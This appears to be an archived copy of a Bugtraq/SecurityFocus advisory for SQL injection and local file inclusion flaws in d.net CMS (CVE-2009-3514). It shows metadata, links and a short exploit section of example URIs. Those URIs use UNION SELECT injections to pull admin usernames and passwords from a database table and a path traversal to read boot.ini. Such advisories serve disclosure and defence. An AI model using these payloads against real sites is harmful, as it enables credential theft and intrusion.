@@ -1,0 +1,98 @@
+#SpeeDr00t@Black Falcon<br>#bid43313<p><b><span style="font-size: 18pt;">d.net CMS SQL Injection and Local File Include Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/43313/info">info</a><br><a href="http://www.securityfocus.com/bid/43313/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/43313/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/43313/solution">solution</a><br><a href="http://www.securityfocus.com/bid/43313/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				43313
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2009-3514<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jul 30 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Sep 30 2010 08:40PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				SirGod
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Marcin Manek d.net CMS  0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x44000/43313/43313.php">#exploit_43313.php</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can use a browser to exploit these issues.<br/><br/>The following exploit code and example URIs are available:<br/><br/>http://www.example.com/path/index.php?page=null+union+all+select+1,concat_ws(0x3a,username,password),3,4,5,<br/>6,7+from+cms_security_master+where+id=1--<br/>http://www.example.com/path/dnet_admin/index.php?edit_id=null+union+all+select+1,concat_ws(0x3a,username,password),3,4,5,<br/>6,7,8,9+from+cms_security_master+where+id=1--&amp;amp;_p=1&amp;amp;type=news<br/>http://www.example.com/path/dnet_admin/index.php?edit_id=1&amp;amp;_p=null+union+all+select+1,2,concat_ws(0x3a,username,password),4,<br/>5,6,7+from+cms_security_master+where+id=1--&amp;amp;type=news<br/>http://www.example.com/path/dnet_admin/index.php?edit_id=2&amp;amp;_p=2&amp;amp;type=../../../../../../boot.ini%00
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/43313.php">/data/vulnerabilities/exploits/43313.php</a></li>
+</ul>
+</div>
